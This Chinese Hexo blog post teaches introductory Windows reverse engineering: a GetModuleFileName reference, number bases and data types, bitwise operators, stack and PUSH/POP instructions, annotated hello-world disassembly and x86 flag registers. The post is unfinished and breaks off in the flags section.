



<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://example.com/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://example.com/atom.xml" />
<link rel="alternate" type="application/json" title="Hexo" href="http://example.com/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="逆向" />


<link rel="canonical" href="http://example.com/2023/10/01/1234567/">



  <title>
windows逆向进阶 - 逆向 |
Yume Shoka = Hexo</title>
<meta name="generator" content="Hexo 5.4.2"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">windows逆向进阶
  </h1>
  
<div class="meta">
  <span class="item" title="Created: 2023-10-01 13:38:45">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">Posted on</span>
    <time itemprop="dateCreated datePublished" datetime="2023-10-01T13:38:45+08:00">2023-10-01</time>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="Toggle navigation bar">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">Yume Shoka</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://img.timelessq.com/images/2022/07/26/08e73cd8998a540ab698836447eeea91.jpg"></li>
          <li class="item" data-background-image="https://img.timelessq.com/images/2022/07/26/4c481240fd5e6e7b076ca8fe50da6e52.jpg"></li>
          <li class="item" data-background-image="https://img.timelessq.com/images/2022/07/26/a1f3404a5032323ea4857ac5a6354d2f.jpg"></li>
          <li class="item" data-background-image="https://img.timelessq.com/images/2022/07/26/7d1757ae7aca8931bc8769df0287647f.jpg"></li>
          <li class="item" data-background-image="https://img.timelessq.com/images/2022/07/26/9e00cb8944af8ad12fd6b7fd7eb24ebc.jpg"></li>
          <li class="item" data-background-image="https://img.timelessq.com/images/2022/07/26/c22bb7736559a7554506b05203018145.jpg"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E9%80%86%E5%90%91/" itemprop="item" rel="index" title="In 逆向"><span itemprop="name">逆向</span></a>
<meta itemprop="position" content="1" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
  <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/01/1234567/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="John Doe">
    <meta itemprop="description" content=", ">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Hexo">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <p><strong>暂停更新，未完结</strong></p>
<h1 id="windows-逆向"><a class="markdownIt-Anchor" href="#windows-逆向">#</a> Windows 逆向</h1>
<h2 id="winapi速查表"><a class="markdownIt-Anchor" href="#winapi速查表">#</a> WinApi 速查表</h2>
<h3 id="getmodulefilename"><a class="markdownIt-Anchor" href="#getmodulefilename">#</a> GetModuleFileName</h3>
<p>获取当前进程已加载模块的文件的完整路径，该模块必须由当前进程加载。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">DWORD GetModuleFileName(  </span><br><span class="line">  HMODULE hModule,    // handle to module</span><br><span class="line">  LPTSTR lpFilename,  // file name of module</span><br><span class="line">  DWORD nSize         // size of buffer);</span><br><span class="line"></span><br><span class="line">00402016  |.  68 08020000       push    0x208                            ; /BufSize = 208 (520.)</span><br><span class="line">0040201B  |.  33DB              xor     ebx,ebx                          ; |</span><br><span class="line">0040201D  |.  50                push    eax                              ; |PathBuffer</span><br><span class="line">0040201E  |.  53                push    ebx                              ; |hModule =&gt; NULL</span><br><span class="line">0040201F  |.  FF15 8C804000     call    dword ptr ds:[&lt;&amp;KERNEL32.GetModu&gt;; \GetModuleFileNameA</span><br><span class="line"></span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">BOOL CreateSampleService()</span><br><span class="line">&#123;</span><br><span class="line">    TCHAR szPath[MAX_PATH];</span><br><span class="line">    if( !GetModuleFileName( NULL, szPath, MAX_PATH ) )</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;GetModuleFileName failed (%d)\n&quot;, GetLastError());</span><br><span class="line">        return FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">如果想获得某个正在运行的EXE或者DLL的全路径可以这样写代码</span><br><span class="line">GetModuleFileNameEx(hProcess,hInst,lpFile,MAX_PATH);//注意下缓冲区就行了。</span><br></pre></td></tr></table></figure>
<h2 id="c语言"><a class="markdownIt-Anchor" href="#c语言">#</a> C 语言</h2>
<h3 id="进制转换"><a class="markdownIt-Anchor" href="#进制转换">#</a> 进制转换</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">十进制的定义：由十个符号组成，分别是0 1 2 3 4 5 6 7 8 9 逢十进一</span><br><span class="line">九进制的定义：由九个符号组成，分别是0 1 2 3 4 5 6 7 8 逢九进一</span><br><span class="line">十六进制的定义：由十六个符号组成，分别是0 1 2 3 4 5 6 7 8 9 A B C D E F</span><br><span class="line">N进制的定义：由N个符号组成 逢N进一</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/c7f63c451ccc451ab28baad170247bcd.png" alt="img"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/8152a3f7846a4908857796b308186582.png" alt="img"></p>
<h3 id="数据类型"><a class="markdownIt-Anchor" href="#数据类型">#</a> 数据类型</h3>
<p>在计算机中，由于硬件的制约，数据是有长度限制的，超过数据宽度的数据会被丢弃。如果没有长度限制，会产生溢出</p>
<p>同一个数据，表示无符号数和有符号数则其含义不同</p>
<ol>
<li>无符号数：正数</li>
<li>有符号数：正数、负数</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">无符号数：</span><br><span class="line">数据0123456789101112131415十六进制0123456789ABCDEF二进制0000000100100011010001010110011110001001101010111100110111101111</span><br><span class="line"></span><br><span class="line">有符号数：</span><br><span class="line">正数：</span><br><span class="line">数据01234567十六进制01234567二进制00001001000110100010101100111</span><br><span class="line">负数：</span><br><span class="line">数据-1-2-3-4-5-6-7-8十六进制FEDCBA98二进制11111110110111001011101010011000</span><br><span class="line">可以发现当数据为1011，把数据看作无符号数时，数据表示为B</span><br><span class="line">把数据看作有符号数时，数据表示为-5</span><br><span class="line">无符号数的表示范围为0～2^4-1即0～15\\ 有符号数的表示范围为-2^3～2^3-1即-8～7</span><br></pre></td></tr></table></figure>
<h4 id="常见的数据类型"><a class="markdownIt-Anchor" href="#常见的数据类型">#</a> 常见的数据类型</h4>
<ul>
<li>BYTE             字节      8BIT</li>
<li>WORD           字       16BIT 2 字节</li>
<li>DWORD       双字      32BIT 4 字节</li>
</ul>
<h4 id="常见的运算符类型重要"><a class="markdownIt-Anchor" href="#常见的运算符类型重要">#</a> 常见的运算符类型（重要）</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">或运算（or |）</span><br><span class="line">只要有一个为1则结果为1</span><br><span class="line">与运算（and &amp;）</span><br><span class="line">两个都是1结果才为1</span><br><span class="line">异或运算（xor ^）</span><br><span class="line">相同为0 不同为1</span><br><span class="line">非运算(not !)</span><br><span class="line">取反 1是0 0是1</span><br></pre></td></tr></table></figure>
<h3 id="堆栈"><a class="markdownIt-Anchor" href="#堆栈">#</a> 堆栈</h3>
<p>临时存放一些寄存器已无法存放的数据，比如超过内存对齐的数据类型</p>
<h4 id="hello-world"><a class="markdownIt-Anchor" href="#hello-world">#</a> hello world</h4>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Hello World!\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">00401010</span> &gt;|&gt; \<span class="number">55</span>            push    ebp</span><br><span class="line"><span class="number">00401011</span>  |.  <span class="number">8B</span>EC          mov     ebp,esp</span><br><span class="line"><span class="number">00401013</span>  |.  <span class="number">83</span>EC <span class="number">40</span>       sub     esp,<span class="number">0x40</span></span><br><span class="line"><span class="number">00401016</span>  |.  <span class="number">53</span>            push    ebx</span><br><span class="line"><span class="number">00401017</span>  |.  <span class="number">56</span>            push    esi</span><br><span class="line"><span class="number">00401018</span>  |.  <span class="number">57</span>            push    edi</span><br><span class="line"><span class="number">00401019</span>  |.  <span class="number">8</span>D7D C0       lea     edi,[local<span class="number">.16</span>]</span><br><span class="line"><span class="number">0040101</span>C  |.  B9 <span class="number">10000000</span>   mov     ecx,<span class="number">0x10</span></span><br><span class="line"><span class="number">00401021</span>  |.  B8 CCCCCCCC   mov     eax,<span class="number">0xCCCCCCCC</span></span><br><span class="line"><span class="number">00401026</span>  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class="line"><span class="number">00401028</span>  |.  <span class="number">68</span> <span class="number">1</span>C204200   push    <span class="number">0042201</span>C                         ; /format = <span class="string">&quot;Hello World!</span></span><br><span class="line"><span class="string">0040102D  |.  E8 2E000000   call    printf                           ; \printf</span></span><br><span class="line"><span class="string">00401032  |.  83C4 04       add     esp,0x4</span></span><br><span class="line"><span class="string">00401035  |.  33C0          xor     eax,eax</span></span><br><span class="line"><span class="string">00401037  |.  5F            pop     edi</span></span><br><span class="line"><span class="string">00401038  |.  5E            pop     esi</span></span><br><span class="line"><span class="string">00401039  |.  5B            pop     ebx</span></span><br><span class="line"><span class="string">0040103A  |.  83C4 40       add     esp,0x40</span></span><br><span class="line"><span class="string">0040103D  |.  3BEC          cmp     ebp,esp</span></span><br><span class="line"><span class="string">0040103F  |.  E8 9C000000   call    _chkesp</span></span><br><span class="line"><span class="string">00401044  |.  8BE5          mov     esp,ebp</span></span><br><span class="line"><span class="string">00401046  |.  5D            pop     ebp</span></span><br><span class="line"><span class="string">00401047  \.  C3            retn</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	TCHAR string123[<span class="number">100</span>] = &#123;<span class="string">&quot;Hello World!\0&quot;</span>&#125;;</span><br><span class="line">	<span class="comment">//printf(&quot;%s\n&quot;,string123);</span></span><br><span class="line">	<span class="comment">//printf(&quot;Hello World!\n&quot;);</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">0040</span>D6F0 &gt;/&gt; \<span class="number">55</span>                  push    ebp</span><br><span class="line"><span class="number">0040</span>D6F1  |.  <span class="number">8B</span>EC                mov     ebp,esp</span><br><span class="line"><span class="number">0040</span>D6F3  |.  <span class="number">81</span>EC A4000000       sub     esp,<span class="number">0xA4</span></span><br><span class="line"><span class="number">0040</span>D6F9  |.  <span class="number">53</span>                  push    ebx</span><br><span class="line"><span class="number">0040</span>D6FA  |.  <span class="number">56</span>                  push    esi</span><br><span class="line"><span class="number">0040</span>D6FB  |.  <span class="number">57</span>                  push    edi</span><br><span class="line"><span class="number">0040</span>D6FC  |.  <span class="number">8</span>DBD <span class="number">5</span>CFFFFFF       lea     edi,[local<span class="number">.41</span>]</span><br><span class="line"><span class="number">0040</span>D702  |.  B9 <span class="number">29000000</span>         mov     ecx,<span class="number">0x29</span></span><br><span class="line"><span class="number">0040</span>D707  |.  B8 CCCCCCCC         mov     eax,<span class="number">0xCCCCCCCC</span></span><br><span class="line"><span class="number">0040</span>D70C  |.  F3:AB               rep     stos dword ptr es:[edi]</span><br><span class="line"><span class="number">0040</span>D70E  |.  A1 <span class="number">1</span>C204200         mov     eax,dword ptr ds:[<span class="number">0x42201C</span>]</span><br><span class="line"><span class="number">0040</span>D713  |.  <span class="number">8945</span> <span class="number">9</span>C             mov     [local<span class="number">.25</span>],eax</span><br><span class="line"><span class="number">0040</span>D716  |.  <span class="number">8B</span>0D <span class="number">20204200</span>       mov     ecx,dword ptr ds:[<span class="number">0x422020</span>]</span><br><span class="line"><span class="number">0040</span>D71C  |.  <span class="number">894</span>D A0             mov     [local<span class="number">.24</span>],ecx</span><br><span class="line"><span class="number">0040</span>D71F  |.  <span class="number">8B</span>15 <span class="number">24204200</span>       mov     edx,dword ptr ds:[<span class="number">0x422024</span>]</span><br><span class="line"><span class="number">0040</span>D725  |.  <span class="number">8955</span> A4             mov     [local<span class="number">.23</span>],edx</span><br><span class="line"><span class="number">0040</span>D728  |.  <span class="number">66</span>:A1 <span class="number">28204200</span>      mov     ax,word ptr ds:[<span class="number">0x422028</span>]</span><br><span class="line"><span class="number">0040</span>D72E  |.  <span class="number">66</span>:<span class="number">8945</span> A8          mov     word ptr ss:[ebp<span class="number">-0x58</span>],ax</span><br><span class="line"><span class="number">0040</span>D732  |.  B9 <span class="number">15000000</span>         mov     ecx,<span class="number">0x15</span></span><br><span class="line"><span class="number">0040</span>D737  |.  <span class="number">33</span>C0                <span class="keyword">xor</span>     eax,eax</span><br><span class="line"><span class="number">0040</span>D739  |.  <span class="number">8</span>D7D AA             lea     edi,dword ptr ss:[ebp<span class="number">-0x56</span>]</span><br><span class="line"><span class="number">0040</span>D73C  |.  F3:AB               rep     stos dword ptr es:[edi]</span><br><span class="line"><span class="number">0040</span>D73E  |.  <span class="number">66</span>:AB               stos    word ptr es:[edi]</span><br><span class="line"><span class="number">0040</span>D740  |.  <span class="number">33</span>C0                <span class="keyword">xor</span>     eax,eax</span><br><span class="line"><span class="number">0040</span>D742  |.  <span class="number">5F</span>                  pop     edi</span><br><span class="line"><span class="number">0040</span>D743  |.  <span class="number">5</span>E                  pop     esi</span><br><span class="line"><span class="number">0040</span>D744  |.  <span class="number">5B</span>                  pop     ebx</span><br><span class="line"><span class="number">0040</span>D745  |.  <span class="number">8B</span>E5                mov     esp,ebp</span><br><span class="line"><span class="number">0040</span>D747  |.  <span class="number">5</span>D                  pop     ebp</span><br><span class="line"><span class="number">0040</span>D748  \.  C3                  retn</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Windows 分配栈时 是从高地址往低地址分配:</p>
<ol>
<li>MOV EBX,0x13FFDC     BASE</li>
<li>MOV EDX,0x13FFDC     TOP</li>
</ol>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230916132649432.png" alt="image-20230916132649432"></p>
<p>符号含义 r 寄存器 m 内存 imm 立即数 r88 位通用寄存器 m88 位内存 imm88 位立即数</p>
<h4 id="push指令"><a class="markdownIt-Anchor" href="#push指令">#</a> PUSH 指令</h4>
<p>PUSH r32</p>
<p>PUSH r16</p>
<p>PUSH m16</p>
<p>PUSH m32</p>
<p>PUSH imm8/imm16/imm32</p>
<h5 id="所有的push都是将esp-4"><a class="markdownIt-Anchor" href="#所有的push都是将esp-4">#</a> 所有的 push 都是将 esp-4?</h5>
<p>压入的数据的<strong>数据宽度：</strong></p>
<p>当 push 的是立即数将 esp-4</p>
<p>当 push r32 如 push eax 时将 esp-4</p>
<p>当 push dword ptr ds:[12FFDA] 即压入双字内存地址中的数据时将 esp-4</p>
<p>当 push word ptr ds:[12FFDA] 即压入字内存地址中的数据时将 esp-2</p>
<p>当 push ax，即 r16 ，16 位通用寄存器时，esp-2</p>
<p>push <strong>不允许压入数据宽度为 8</strong> 的数据 如 ah al 和 byte ptr ds:[内存编号]</p>
<h4 id="pop指令"><a class="markdownIt-Anchor" href="#pop指令">#</a> POP 指令</h4>
<p>POP r32</p>
<p>POP r16</p>
<p>POP m16</p>
<p>POP m32</p>
<h4 id="pushad和popad指令"><a class="markdownIt-Anchor" href="#pushad和popad指令">#</a> PUSHAD 和 POPAD 指令</h4>
<p>将所有的 32 位通用寄存器压入堆栈，方便后面随意使用寄存器，用于保护现场</p>
<p>与 POPAD 对应</p>
<h4 id="pushfd和popfd指令"><a class="markdownIt-Anchor" href="#pushfd和popfd指令">#</a> PUSHFD 和 POPFD 指令</h4>
<p>然后将 32 位标志寄存器 EFLAGS 压入堆栈</p>
<p>与 POPAD 对应</p>
<h4 id="其它相关指令"><a class="markdownIt-Anchor" href="#其它相关指令">#</a> 其它相关指令</h4>
<p>pusha: 将所有的 16 位通用寄存器压入堆栈</p>
<p>popa: 将所有的 16 位通用寄存器取出堆栈</p>
<p>pushf:: 将的 16 位标志寄存器 EFLAGS 压入堆栈</p>
<p>popf: 将 16 位标志寄存器 EFLAGS 取出堆栈</p>
<p>栈底和栈顶原理：</p>
<ol>
<li>控制栈顶和栈底分别为两个固定的寄存器 (EBP 基址指针寄存器 和 ESP 堆栈指针寄存器）</li>
<li>刚开始堆栈为空，栈顶和栈底相同</li>
</ol>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230916133004633.png" alt="image-20230916133004633"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230916133048269.png" alt="image-20230916133048269"></p>
<p>ebp - 4 函数中的局部变量</p>
<p>ebp+8  函数传入参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">提升堆栈</span><br><span class="line">对应语句为</span><br><span class="line">00401040  /&gt; \55            push ebp</span><br><span class="line">00401041  |.  8BEC          mov ebp,esp</span><br><span class="line">00401043  |.  83EC 40       sub esp,0x40</span><br><span class="line"></span><br><span class="line">将堆栈提升了0x40</span><br><span class="line"></span><br><span class="line">保护现场</span><br><span class="line">对应语句为</span><br><span class="line">00401046  |.  53            push ebx</span><br><span class="line">00401047  |.  56            push esi</span><br><span class="line">00401048  |.  57            push edi</span><br><span class="line"></span><br><span class="line">将ebx、esi、edi三个通用寄存器保存到堆栈中，前面的push ebp其实也属于保护现场</span><br><span class="line"></span><br><span class="line">初始化提升的堆栈</span><br><span class="line">00401049  |.  8D7D C0       lea edi,dword ptr ss:[ebp-0x40]</span><br><span class="line">0040104C  |.  B9 10000000   mov ecx,0x10</span><br><span class="line">00401051  |.  B8 CCCCCCCC   mov eax,0xCCCCCCCC</span><br><span class="line">00401056  |.  F3:AB         rep stos dword ptr es:[edi]</span><br><span class="line"></span><br><span class="line">这里将我们提升的堆栈中的内容全部初始化为CCCCCCCC</span><br><span class="line"></span><br><span class="line">为什么是初始化为CC？防止缓冲溢出</span><br><span class="line"></span><br><span class="line">CC的硬编码对应的指令为int 3，即断点</span><br><span class="line"></span><br><span class="line">这么做有什么好处呢？当程序执行超过缓冲区时，遇到int 3就会自动停下来</span><br><span class="line"></span><br><span class="line">执行实际的内容</span><br><span class="line">对应语句为</span><br><span class="line">00401058  |.  8B45 08       mov eax,dword ptr ss:[ebp+0x8]</span><br><span class="line">0040105B  |.  0345 0C       add eax,dword ptr ss:[ebp+0xC]</span><br><span class="line"></span><br><span class="line">就是将前面压入的参数2和1进行相加得到3</span><br><span class="line"></span><br><span class="line">恢复现场</span><br><span class="line">对应语句为</span><br><span class="line">0040105E  |.  5F            pop edi                                  ;  HelloWor.00401171</span><br><span class="line">0040105F  |.  5E            pop esi                                  ;  HelloWor.00401171</span><br><span class="line">00401060  |.  5B            pop ebx                                  ;  HelloWor.00401171</span><br><span class="line">00401061  |.  8BE5          mov esp,ebp</span><br><span class="line">00401063  |.  5D            pop ebp                                  ;  HelloWor.00401171</span><br><span class="line"></span><br><span class="line">与前面保护现场相对应</span><br><span class="line"></span><br><span class="line">返回</span><br><span class="line">对应语句为</span><br><span class="line">00401064  \.  C3            retn</span><br><span class="line"></span><br><span class="line">CALL返回后</span><br><span class="line">对应语句为</span><br><span class="line">00401171  |.  83C4 08       add esp,0x8</span><br><span class="line"></span><br><span class="line">作用为平衡堆栈</span><br></pre></td></tr></table></figure>
<h3 id="标志寄存器"><a class="markdownIt-Anchor" href="#标志寄存器">#</a> 标志寄存器</h3>
<ol>
<li>
<p>进位标志 CF (Carry Flag)</p>
<p>如果运算结果的<strong>最高位</strong>产生了一个进位或借位，那么，其值为 1，否则其值为 0</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,0xFF</span><br><span class="line">ADD AL,1</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>奇偶标志 PF (Parity  Flag)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV AX,803</span><br><span class="line">ADD AX,1</span><br></pre></td></tr></table></figure>
<p>执行结果</p>
<p>0x804: 0000 1000 0000 0100     总共 2 个 1 ,PF 应为 1，但实际运行结果 PF 为 0</p>
<p>因为 PF 是根据最低有效字节来看，即 8<strong>04</strong> 后面 04 的这部分</p>
<p>04： 0000 0100 总共 1 个 1，所以 PF 为 0</p>
</li>
<li>
<p>辅助进位标志 AF (Auxiliary  Carry Flag)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0：</span><br><span class="line"></span><br><span class="line">在字操作时，发生低字节向高字节进位或借位时</span><br><span class="line">在字节操作时，发生低4位向高4位进位或借位时</span><br><span class="line"></span><br><span class="line">AF与数据宽度相关</span><br><span class="line"></span><br><span class="line">32位时 FFFF F FFF</span><br><span class="line"></span><br><span class="line">16位时 FF F F</span><br><span class="line"></span><br><span class="line">8位时 F F</span><br><span class="line"></span><br><span class="line">加黑的字体为AF标志位判断的位置，如果该位置要向前进位则AF为1，否则为0，和CF相似，不过判断的位置不同 </span><br><span class="line">MOV EAX,55EEFFFF</span><br><span class="line"></span><br><span class="line">ADD EAX,2</span><br></pre></td></tr></table></figure>
</li>
<li>
